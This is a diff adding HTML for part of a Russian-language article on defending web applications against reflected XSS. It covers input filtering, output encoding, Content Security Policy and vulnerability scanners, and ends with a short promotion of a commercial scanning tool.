+        Команды безопасности также должны применять белые/черные списки для шаблонов данных, которые должны быть приняты
+        или отклонены. Кроме того, группам контроля качества и администраторам рекомендуется рассматривать данные как от
+        аутентифицированных, так и от общедоступных пользователей как ненадежные входные данные, применяя одни и те же
+        методы очистки входных данных для всех пользователей.
+ </p>
+ <ul dir="auto">
+  <li>
+   Избегать динамического контента
+  </li>
+ </ul>
+ <p dir="auto">
+  Предположим, что приложение использует управляемые пользователем данные как часть своих HTTP-ответов.
+        В этом случае выходные данные должны быть закодированы таким образом, чтобы сервер не интерпретировал их как
+        активное содержимое. Это гарантирует, что любые специальные символы из хранилища данных приложения
+        обрабатываются как содержимое тега HTML, а не как необработанный HTML. Рекомендуется заменить любые значимые
+        динамические символы схемами кодирования объектов HTML для безопасной интерпретации. Разработчикам следует
+        использовать специальные инструменты для включения безопасной таблицы стилей и кодирования скриптов, если
+        динамическое содержимое вставляется в теги &lt;script&gt; и &lt;style&gt;.
+ </p>
+ <ul dir="auto">
+  <li>
+   Внедрить политику безопасности контента
+  </li>
+ </ul>
+ <p dir="auto">
+  Надежная политика безопасности содержимого позволяет веб-администраторам/разработчикам контролировать,
+        откуда веб-страница может загружать и выполнять сценарии. Поскольку отраженная атака XSS основана на внедрении
+        злоумышленником вредоносного контента на веб-страницу, CSP предотвращают атаки, указывая источники встроенных
+        сценариев. Большинство современных браузеров поддерживают CSP, что делает их одним из наиболее важных аспектов
+        предотвращения отраженных XSS-атак.
+ </p>
+ <ul dir="auto">
+  <li>
+   Использовать инструмент сканирования уязвимостей
+  </li>
+ </ul>
+ <p dir="auto">
+  Инструменты сканирования уязвимостей автоматически тестируют веб-приложения и лежащий в их основе
+        исходный код для выявления слабых в безопасности, которые могут привести к успешному выполнению XSS-атак.
+        Crashtest Security Suite включает инструмент XSS, который может сканировать JavaScript и веб-приложения на
+        наличие уязвимостей, таких как XSS, без ложных срабатываний.
+ </p>
+</article>
